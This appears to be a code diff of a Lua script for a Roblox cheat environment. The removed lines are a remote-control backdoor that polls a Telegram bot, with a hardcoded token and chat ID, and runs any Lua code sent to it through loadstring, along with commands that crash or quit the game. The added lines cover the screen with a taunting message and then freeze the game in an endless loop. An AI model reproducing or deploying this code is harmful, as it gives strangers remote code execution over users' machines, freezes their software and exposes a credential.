@@ -1,70 +1,18 @@
--- Xeno Remote Control Script (Telegram Bot API)
-local BOT_TOKEN = "7977017981:AAEm8p5axwhAzqgcnLGaY3fbmB1NtWWSl8Q"
-local CHAT_ID = "6657232556"
-local API_URL = "https://api.telegram.org/bot"..BOT_TOKEN
-local last_update_id = 0
-local player_name = engine.GetPlayerInfo(engine.GetLocalPlayerIndex()).name
+-- Создаем огромный текст на весь экран
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game:GetService("CoreGui")
 
--- Безопасная отправка сообщений
-local function SafeChatPrint(msg)
-    pcall(function()
-        client.ChatPrint(msg)
-    end)
-end
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+textLabel.Text = "МАМКИН ЧИТЕР >:)"
+textLabel.TextColor3 = Color3.new(1, 0, 0)
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextSize = 100
+textLabel.TextScaled = true
+textLabel.Parent = screenGui
 
--- Выполнение Lua-кода
-local function ExecuteLua(code)
-    pcall(function()
-        loadstring(code)()
-    end)
-end
-
--- Краш Roblox (имитация)
-local function CrashRoblox()
-    ExecuteLua([[
-        while true do
-            print("CRASHING...")
-            gui.SetValue("rbot.antiaim.rotation", math.random(-180, 180))
-            client.Command("quit", true)
-        end
-    ]])
-end
-
--- Проверка команд от бота
-local function CheckTelegramCommands()
-    local response = http.Get(API_URL.."/getUpdates?offset="..(last_update_id + 1))
-    if not response or response == "null" then return end
-    
-    local data = json.decode(response)
-    if not data or not data.result then return end
-
-    for _, update in ipairs(data.result) do
-        last_update_id = update.update_id
-        if update.message and update.message.text then
-            local msg = update.message.text
-            
-            -- Обработка команд
-            if msg:starts("/chat ") then
-                local chat_msg = msg:sub(7)
-                SafeChatPrint("["..player_name.."]: "..chat_msg)
-                
-            elseif msg:starts("/lua ") then
-                local lua_code = msg:sub(6)
-                ExecuteLua(lua_code)
-                
-            elseif msg == "/crash_roblox" then
-                CrashRoblox()
-            end
-        end
-    end
-end
-
--- Основной цикл проверки команд
-callbacks.Register("Draw", "TelegramControl", function()
-    if globals.RealTime() % 3 < 0.1 then  -- Проверяем каждые 3 секунды
-        CheckTelegramCommands()
-    end
-end)
-
--- Уведомление о запуске (в консоль)
-print("[Xeno Remote] Script activated! Waiting for Telegram commands...")
+-- Зависаем игру намертво
+wait(1)
+while true do end
